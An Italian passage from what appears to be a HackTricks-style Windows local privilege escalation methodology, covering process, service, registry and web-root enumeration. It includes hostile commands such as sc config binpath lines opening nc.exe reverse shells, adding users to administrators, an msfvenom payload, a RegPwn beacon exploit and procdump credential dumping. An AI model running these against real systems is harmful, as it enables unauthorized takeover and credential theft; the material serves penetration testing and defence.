Se **appartieni a un gruppo con privilegi elevati, potresti essere in grado di eseguire un'escalation dei privilegi**. Scopri di più sui gruppi con privilegi elevati e su come abusarne per eseguire un'escalation dei privilegi qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cosa sia un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire i token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni

```bash
qwinsta
klist sessions
```

### Cartelle home

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politica delle password

```bash
net accounts
```

### Ottieni il contenuto degli appunti

```bash
powershell -command "Get-Clipboard"
```

## Processi in esecuzione

### Permessi di file e cartelle

Innanzitutto, quando elenchi i processi, **controlla se ci sono password nella riga di comando del processo**.\
Verifica se puoi **sovrascrivere un binario in esecuzione** o se hai i permessi di scrittura sulla cartella del binario, per sfruttare eventuali [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Controlla sempre se sono in esecuzione [**debugger electron/cef/chromium**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), potresti abusarne per aumentare i privilegi.

Un debugger listener può essere attivo solo per poco tempo, quindi la sua assenza da una singola rilevazione passiva delle porte non dimostra che non sia mai stato esposto. Correlate ogni listener osservato con il relativo PID, il proprietario del processo e la possibilità per l'utente con privilegi inferiori di raggiungerlo; il nome di un'applicazione o un flag di debug, da soli, non dimostrano che sia possibile eseguire codice tra utenti diversi. Mantieni passiva l'enumerazione ordinaria, senza inviare comandi al debugger.

**Verifica dei permessi dei binari dei processi**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Verifica dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Directory dei dynamic preprocessor di Snort

Snort 2 può caricare librerie condivise da una `dynamicpreprocessor directory` dichiarata nella configurazione selezionata con `snort.exe -c <config>`. Per un'attività pianificata o un servizio che esegue Snort con un account diverso, esamina quella configurazione specifica e le ACL della directory dei moduli dichiarata. Se il tuo token può creare file in quella directory, il percorso è un candidato da esaminare per l'esecuzione di codice al successivo caricamento dei moduli da parte dell'attività o del servizio. Verifica i privilegi effettivi dell'account di esecuzione, la configurazione attiva, la compatibilità dei moduli e qualsiasi restrizione di negazione o condivisione; una directory scrivibile, da sola, non dimostra un'escalation. La [documentazione di Snort sui dynamic preprocessor](https://www.snort.org/documents/dpx-readme) descrive il caricamento dei moduli in fase di esecuzione.

### Servizio web con privilegi elevati e una document root scrivibile

In un'installazione Windows di Apache, confronta il percorso dell'eseguibile del servizio e l'account di esecuzione con la `DocumentRoot` in `httpd.conf` attivo. Per una configurazione XAMPP convenzionale, esamina `C:\xampp\apache\conf\httpd.conf` e le ACL della document root configurata, spesso `C:\xampp\htdocs`. Se un utente con privilegi inferiori può creare file in quella directory mentre Apache è in esecuzione come `LocalSystem`, l'esecuzione di codice lato server può oltrepassare il confine dei privilegi dell'host. Verifica che il servizio sia in esecuzione, che venga servito il percorso esatto e che un handler lato server elabori il tipo di file; una root scrivibile dimostra soltanto la possibilità di creare file. Esamina le ACL senza scrivere un file di prova:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Per un'installazione WAMP convenzionale, il servizio può puntare a un percorso con versione `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (o `C:\wamp\...` per una configurazione a 32 bit), con la configurazione nella directory accanto, in `conf\httpd.conf`, e una root predefinita `C:\wamp64\www` o `C:\wamp\www`. Verifica insieme l'immagine esatta del servizio, l'identità con cui viene eseguito, il `DocumentRoot` effettivo (inclusa l'espansione di `${INSTALL_DIR}` e le sostituzioni dei virtual host) e l'ACL della root. Una directory WAMP scrivibile non dimostra che Apache venga eseguito come `SYSTEM` o che esegua il file inviato. [Apache documenta come un servizio Windows seleziona la propria configurazione](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root IIS scrivibile e identità di rete dell'application pool

Per IIS, associa una directory fisica scrivibile a un **sito/applicazione attivo** in `applicationHost.config`, quindi identifica il pool configurato e l'handler lato server. Il codice collocato in una directory servita viene eseguito come pool solo se IIS elabora quel tipo di file e la route è raggiungibile. Verifica i permessi effettivi dell'utente corrente per creare file, lo stato di runtime del sito, l'handler e le eventuali sostituzioni per percorso prima di considerare una directory scrivibile come esecuzione di codice.

La compilazione dinamica ASP.NET introduce un percorso distinto da esaminare: i file generati nella directory di compilazione dell'applicazione. Il valore predefinito è una directory `Temporary ASP.NET Files` all'interno dell'installazione .NET Framework pertinente, ma `<compilation tempDirectory>` dell'applicazione può modificarlo. [Microsoft documenta la posizione e le sottodirectory specifiche di ciascuna applicazione](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) e [consiglia di isolare le directory di compilazione quando gli application pool non si considerano attendibili](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Se un token con privilegi inferiori può modificare il codice sorgente generato nella cache della **specifica** applicazione, determina se l'applicazione lo ricompila con un'[identità del worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) più privilegiata. Un'ACL di file o directory, da sola, non dimostra l'esecuzione di codice: correla la cache con l'applicazione attiva, il token e l'ACL effettivi, le impostazioni di compilazione, l'identità del processo e il momento dell'eventuale ricompilazione. Esamina i metadati in sola lettura; durante l'enumerazione non attivare la compilazione né modificare i file della cache.

Un pool IIS configurato come `ApplicationPoolIdentity` o `NetworkService` si autentica comunemente alle risorse di dominio usando l'**account computer host**, anche se il suo token locale può avere privilegi limitati. `LocalSystem` dispone già di privilegi elevati localmente e usa anche l'account computer in rete; `LocalService` presenta normalmente credenziali di rete anonime. Un pool `SpecificUser` usa invece l'account configurato. [Microsoft documenta questi tipi di identità](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) e [l'identità di rete dell'application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Un'impostazione di identità omessa può ereditare i valori predefiniti del pool, che variano tra le diverse generazioni di IIS: risolvi quindi la configurazione effettiva invece di dedurla dal nome del pool. Se l'esecuzione di codice raggiunge un pool con identità di rete dell'account computer, valuta i diritti di directory di **quello specifico computer**. [DCSync](../active-directory-methodology/dcsync.md) richiede diritti di replica sul contesto di denominazione del dominio; un ticket dell'account macchina o il ruolo dell'host, da soli, non li dimostrano. L'enumerazione passiva deve esaminare configurazione e ACL senza caricare file, autenticarsi in rete o richiedere ticket.

Per un handler ASP.NET leggibile che avvia un processo helper, traccia qualsiasi valore derivato dalla richiesta attraverso autenticazione, decrittografia, convalida e costruzione del comando. Un handler che concatena un token decodificato in `ProcessStartInfo("cmd", "/c ...")` potrebbe permettere ai metacaratteri della shell di modificare il comando; [Microsoft documenta i caratteri speciali di `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Verifica che un chiamante non attendibile possa effettivamente influenzare il valore decodificato e raggiungere l'handler, quindi determina l'identità effettiva dell'application pool o dell'utente impersonato e quella del processo figlio. Una riga di codice sorgente leggibile, un listener su localhost o una debolezza nel formato del token, da soli, non dimostrano l'esecuzione di comandi con privilegi. Esamina il codice sorgente e la configurazione del pool senza inviare richieste contraffatte né eseguire l'helper durante l'enumerazione passiva.

Per un servizio PHP su Windows, un percorso controllato dalla richiesta e passato a [`include` o `require`](https://www.php.net/manual/en/function.include.php) può valutare un file PHP scrivibile da un utente con privilegi inferiori con l'identità del worker. Verifica che la richiesta possa raggiungere quell'istruzione, che il percorso risolto indichi un file modificabile dall'utente con privilegi inferiori e leggibile dal worker, che le restrizioni PHP applicabili al percorso consentano l'include e che il worker venga effettivamente eseguito con privilegi superiori. Un listener in loopback o un file scrivibile, da soli, non dimostrano questa catena; esamina il codice sorgente, l'identità del servizio e le ACL dei file senza invocare l'endpoint durante l'enumerazione passiva.

### Memory Password mining

Puoi creare un dump della memoria di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP conservano le **credenziali in chiaro in memoria**: prova a eseguire il dump della memoria e a leggere le credenziali.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### App GUI non sicure

**Le applicazioni eseguite come SYSTEM possono consentire a un utente di avviare un CMD o esplorare directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", fai clic su "Click to open Command Prompt"

### Importazione di file di progetto con privilegi elevati

Un'applicazione che apre automaticamente progetti da una directory di importazione scrivibile da utenti con privilegi inferiori attraversa un confine di attendibilità dell'input usando l'account dell'importatore. Esamina il **percorso esatto scrivibile**, il processo o l'attività che lo apre, la sua identità effettiva e la build del parser. Un [problema storico di apertura/ripristino di progetti Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) consentiva l'uso di entità esterne XML nei metadati del progetto; un'entità di rete su Windows poteva causare l'autenticazione dell'account che effettuava l'importazione, se i criteri [SMB in uscita e NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) lo consentivano. È una pista per l'esposizione di credenziali, non un accesso immediato da amministratore: la risposta deve poter essere sfruttata tramite un percorso separato e autorizzato o vulnerabile, e le build attuali vanno valutate in base al loro effettivo stato di patch. Non aprire un progetto appositamente creato durante l'enumerazione passiva; esamina il flusso di importazione e le ACL.

## Servizi

Il diritto [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sull'oggetto Service Control Manager (SCM) è distinto dai diritti su un servizio esistente. Una richiesta di accesso in sola lettura riuscita a [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) per tale diritto è una pista da approfondire, non la prova che sia possibile eseguire un nuovo servizio. [`CreateService` restituisce un handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) con i diritti di accesso al servizio richiesti al momento della creazione; la successiva riapertura del servizio comporta un controllo degli accessi separato e può non riuscire anche quando era possibile usare l'handle originale. Verifica separatamente il token locale o remoto effettivo, i diritti concessi all'handle, l'account del servizio, i criteri di avvio e il percorso dell'eseguibile. Non creare né avviare un servizio durante l'enumerazione passiva.

Per un percorso di installazione remota di un servizio, correla i diritti SCM con una condivisione sul target su cui **lo stesso accesso di rete** può scrivere, con la relativa ACL NTFS sottostante e con un percorso locale dell'eseguibile che l'account del servizio possa eseguire. Un account non amministratore può oltrepassare questo confine se sono presenti diritti SCM insolitamente ampi e un percorso per la collocazione dei file; una condivisione amministrativa non è un prerequisito intrinseco. Il solo accesso in scrittura alla condivisione o la sola pista dei diritti SCM per la creazione di servizi non dimostrano che il nuovo servizio possa essere avviato con un'identità più elevata.

Un servizio esistente può richiamare un eseguibile di supporto all'avvio, all'arresto o in un altro evento del ciclo di vita, anche quando tale eseguibile non è presente nel suo `ImagePath`. Se il nome dell'eseguibile viene risolto in una directory scrivibile da utenti con privilegi inferiori e il servizio viene eseguito con un'identità più elevata, l'assenza del file di supporto costituisce un possibile candidato alla sostituzione, a determinate condizioni. Conferma il **codice effettivo del servizio o il richiamo documentato dell'eseguibile di supporto**, il percorso risolto dell'eseguibile e l'ordine di ricerca, i diritti di creazione nella directory, l'identità del servizio e la disponibilità di un trigger del ciclo di vita. Una directory del servizio scrivibile o un file mancante, da soli, non dimostrano che il servizio carichi quel file; durante la revisione passiva non avviare né arrestare il servizio.

Per un servizio esistente, [`SERVICE_START` consente di fornire argomenti a `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); è distinto da [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Esamina il codice del servizio o la sua interfaccia documentata prima di considerare il diritto di avvio qualcosa di più di un diritto di controllo. Se usa un argomento scelto dal chiamante come percorso di log o di esportazione, verifica l'identità del servizio, l'esatto flusso dall'argomento alla scrittura, le restrizioni sul percorso e i permessi del **file creato**. Una scrittura in una directory protetta può portare a un'escalation solo in presenza di un consumatore o caricatore privilegiato separato che accetti quel file; un log scrivibile o il solo diritto di avvio non bastano. Durante l'inventario passivo non avviare il servizio né creare un file di prova.

Per un agente di monitoraggio NSClient++, un file `nsclient.ini` leggibile è una **pista per la revisione della configurazione**: potrebbe contenere credenziali web, mentre `boot.ini` può reindirizzare la configurazione a un'altra posizione. Controlla l'account effettivo del servizio, il listener WEB e i criteri di accesso, e verifica se il ruolo autenticato può modificare le impostazioni o gli script. L'esecuzione con privilegi elevati richiede inoltre `CheckExternalScripts` (o un altro percorso di esecuzione abilitato), un diritto effettivo di registrare o modificare un comando e un trigger che lo esegua con l'identità del servizio. Un listener limitato al loopback può comunque essere raggiungibile da un utente locale, ma il percorso del file, la password o il listener, da soli, non dimostrano l'esistenza di tali diritti. Durante l'enumerazione passiva esamina i metadati e i permessi senza visualizzare segreti né invocare l'API web. Consulta la [struttura dei file di NSClient++](https://nsclient.org/docs/concepts/file-layout/), le [indicazioni sulla sicurezza web e degli script](https://nsclient.org/docs/setup/securing/) e la [configurazione degli script esterni](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Per un servizio il cui `ImagePath` è `nssm.exe`, esamina l'account effettivo con cui viene eseguito il servizio e il valore `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM memorizza lì l'applicazione figlia](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), mentre `AppDirectory` è la directory di lavoro configurata. Controlla l'eseguibile figlio e le ACL delle directory superiori prima di considerare i permessi del wrapper l'intero confine di sicurezza del servizio. Un endpoint WCF o SOAP locale esposto da tale processo figlio è una pista da esaminare separatamente: verifica che l'utente con privilegi inferiori possa raggiungere il listener, che l'operazione esatta accetti il suo input e che il processo figlio del servizio esegua l'operazione non sicura con un'identità più elevata. L'account del servizio, un URL dell'endpoint o un percorso scrivibile, da soli, non dimostrano un'escalation; durante l'enumerazione passiva evita di invocare le operazioni del servizio.

Per un'operazione WCF personalizzata, segui una stringa controllata dal chiamante fino a un eventuale runspace PowerShell. [`Pipeline.Commands.AddScript` aggiunge testo di script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) e [`Pipeline.Invoke` esegue la pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Un [`netTcpBinding` con credenziali di trasporto Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentica il client, ma occorre verificare separatamente l'autorizzazione a chiamare quella **specifica** operazione e l'identità effettiva del runspace. Un percorso dall'input di un chiamante con privilegi inferiori a `AddScript`, eseguito con un'identità del servizio più elevata, costituisce un confine di esecuzione del codice; una porta in ascolto, un client autenticato o un metodo inutilizzato in un assembly non correlato, da soli, non sono una prova. Durante l'enumerazione esamina staticamente il servizio distribuito, il contratto, l'autorizzazione e le impostazioni di impersonificazione, senza invocare l'endpoint.

I Service Triggers consentono a Windows di avviare un servizio al verificarsi di determinate condizioni (attività di named pipe/endpoint RPC, eventi ETW, disponibilità IP, collegamento di dispositivi, aggiornamento di GPO ecc.). Anche senza diritti SERVICE_START, spesso è possibile avviare servizi privilegiati attivando i relativi trigger. Consulta qui le tecniche di enumerazione e attivazione:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servizio Visual Studio diagnostic collector

Le installazioni di Visual Studio con strumenti C/C++ possono includere `VSStandardCollectorService150`, un servizio diagnostico configurato per essere eseguito come `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) sfruttava una race condition con junction e object-manager link per reindirizzare il ripristino della DACL del servizio. L'escalation dimostrata richiedeva anche un percorso di ripristino MSI utilizzabile per Visual Studio Setup WMI Provider e il relativo target `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Il componente è stato corretto a gennaio 2024.

Per il triage passivo, esamina l'account e il percorso del binario di quel servizio, verifica se il percorso del compilatore Setup WMI esiste e controlla lo stato delle patch del componente installato. Una voce del servizio, la versione del prodotto Visual Studio o il solo file del compilatore non dimostrano che l'host sia vulnerabile. L'ispezione non richiede di avviare il servizio né di eseguire un ripristino.

Ottieni un elenco dei servizi:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio

```bash
sc qc <service_name>
```

Si consiglia di avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegi richiesto per ogni servizio.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Si consiglia di verificare se "Authenticated Users" può modificare qualche servizio:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Puoi scaricare accesschk.exe per XP da qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilitare il servizio

Se ricevi questo errore (ad esempio con SSDPSRV):

_Errore di sistema 1058._\
_Impossibile avviare il servizio perché è disabilitato o perché non è associato a dispositivi abilitati._

Puoi abilitarlo usando

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione alternativa** a questo problema consiste nell'eseguire:

```
sc.exe config usosvc start= auto
```

### **Modificare il percorso del binario del servizio**

Se il gruppo "Authenticated users" dispone di **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Riavviare il servizio

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: consente di riconfigurare il binario del servizio.
- **WRITE_DAC**: consente di riconfigurare le autorizzazioni, permettendo così di modificare la configurazione del servizio.
- **WRITE_OWNER**: consente di acquisire la proprietà e riconfigurare le autorizzazioni.
- **GENERIC_WRITE**: eredita la possibilità di modificare la configurazione del servizio.
- **GENERIC_ALL**: eredita anch'esso la possibilità di modificare la configurazione del servizio.

Per rilevare e sfruttare questa vulnerabilità, è possibile utilizzare _exploit/windows/local/service_permissions_.

### Autorizzazioni deboli sui binari dei servizi

Se un servizio viene eseguito come **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o con un account di dominio privilegiato, ma **gli utenti con privilegi ridotti possono modificare l'EXE del servizio o la relativa cartella principale**, spesso è possibile dirottare il servizio **sostituendo il binario e riavviando il servizio**.

**Verifica se puoi modificare il binario eseguito da un servizio** oppure se disponi di **autorizzazioni di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere l'elenco di tutti i binari eseguiti da un servizio usando **wmic** (non in system32) e verificare le tue autorizzazioni usando **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Puoi anche usare **sc** e **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Cerca ACL pericolose concesse a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, in particolare **`(F)`**, **`(M)`** o **`(W)`** sull'eseguibile del servizio o sulla directory che lo contiene. Un flusso pratico di abuso è:<sup>[[27]](#references)</sup>

1. Verifica l'account del servizio e il percorso dell'eseguibile con `sc qc <service_name>`.
2. Verifica che il binario sia scrivibile con `icacls <path>`.
3. Sostituisci il binario del servizio con un payload o un binario di servizio malevolo valido.
4. Riavvia il servizio con `sc stop <service_name> && sc start <service_name>` (oppure attendi un riavvio / un trigger del servizio).

Controlli automatizzati utili:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Se il servizio non consente a un utente standard di riavviarlo, verifica se si avvia automaticamente all'avvio, se dispone di un'azione in caso di errore che lo riavvia oppure se l'applicazione che lo utilizza può attivarlo indirettamente.

### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare il registro di qualche servizio.\
Puoi **verificare** i tuoi **permessi** sul **registro** di un servizio procedendo così:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Verifica se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** dispongono di autorizzazioni di scrittura nel registro per una specifica chiave del servizio. Una voce ACL da sola non dimostra che l'accesso sia effettivamente consentito: contano le voci di negazione, il token corrente e le autorizzazioni ereditate. I diritti sulle chiavi del registro sono distinti dai diritti `SERVICE_CHANGE_CONFIG` e `SERVICE_START` sull'oggetto servizio. Per l'escalation servono inoltre un campo di configurazione del servizio utilizzabile, un modo per avviare il servizio e un'identità del servizio con privilegi superiori. Consulta la documentazione Microsoft sui [diritti delle chiavi del registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) e sui [diritti di accesso ai servizi](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Per modificare il percorso del binario eseguito:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race con symlink del registro per scrivere valori arbitrari in HKLM (ATConfig)

Alcune funzionalità di Accessibilità di Windows creano chiavi **ATConfig** per utente, che in seguito vengono copiate da un processo **SYSTEM** in una chiave di sessione HKLM. Una **race condition con symbolic link** nel registro può reindirizzare questa scrittura privilegiata verso **qualsiasi percorso HKLM**, offrendo una primitiva per la **scrittura di valori** arbitrari in HKLM.<sup>[[18]](#references)</sup>

Posizioni delle chiavi (esempio: Tastiera su schermo `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` elenca le funzionalità di Accessibilità installate.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` memorizza la configurazione controllata dall'utente.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` viene creata durante l'accesso o le transizioni al desktop sicuro ed è scrivibile dall'utente.

Flusso di abuso (CVE-2026-24291 / ATConfig):

1. Imposta il valore **HKCU ATConfig** che vuoi venga scritto da SYSTEM.
2. Attiva la copia sul desktop sicuro (ad es., **LockWorkstation**), che avvia il flusso del broker AT.
3. **Vinci la race** impostando un **oplock** su `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando scatta l'oplock, sostituisci la chiave **HKLM Session ATConfig** con un **registry link** verso una destinazione HKLM protetta.
4. SYSTEM scrive il valore scelto dall'attaccante nel percorso HKLM reindirizzato.

Una volta ottenuta la scrittura arbitraria di valori in HKLM, passa a LPE sovrascrivendo i valori di configurazione dei servizi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/riga di comando)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Scegli un servizio che un utente normale può avviare (ad es., **`msiserver`**) e attivalo dopo la scrittura. **Nota:** l'implementazione dell'exploit pubblica **blocca la workstation** come parte della race.

Tool di esempio (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Se disponi di questa autorizzazione su una chiave del registro, **puoi creare sottochiavi al suo interno**. Nel caso dei servizi Windows, è **sufficiente per eseguire codice arbitrario**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows proverà a eseguire ogni possibile percorso che termina prima di uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows proverà a eseguire:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Elenca tutti i percorsi dei servizi non racchiusi tra virgolette, escludendo quelli appartenenti ai servizi Windows integrati:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**È possibile rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` È possibile creare manualmente un binario del servizio con metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Azioni di ripristino

Windows consente agli utenti di specificare le azioni da eseguire in caso di errore di un servizio. Questa funzionalità può essere configurata per puntare a un binario. Se il binario può essere sostituito, potrebbe essere possibile eseguire un’escalation dei privilegi. Maggiori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Destinazioni degli script delle attività pianificate

Per un’attività abilitata che esegue `cmd.exe /c` con un file `.bat` o `.cmd`, controlla lo script indicato negli **argomenti dell’azione** oltre a `cmd.exe`. Lo stesso vale per l’argomento file esplicito di un interprete, come `-File` di PowerShell. Se un file batch pianificato contiene una chiamata letterale a PowerShell `-File`, controlla anche l’ACL dello script indicato; variabili, condizioni e concatenazioni di comandi richiedono una verifica manuale. Uno script o una directory padre scrivibile dall’utente chiamante è un possibile vettore di esecuzione tra account solo se l’entità di sicurezza configurata per l’attività è diversa dal chiamante e l’attività raggiunge effettivamente quell’azione. Un’ACL che consente solo l’aggiunta può essere rilevante per gli script, ma un `exit` precedente o un altro flusso di controllo potrebbe rendere irraggiungibili le righe aggiunte. Verifica le ACL effettive, il [contesto di esecuzione dell’attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), la directory di lavoro, il trigger e i criteri di controllo delle applicazioni prima di affermare che è possibile un’escalation. L’inventario non deve modificare lo script né avviare l’attività.

## Flussi denominati nei file accessibili

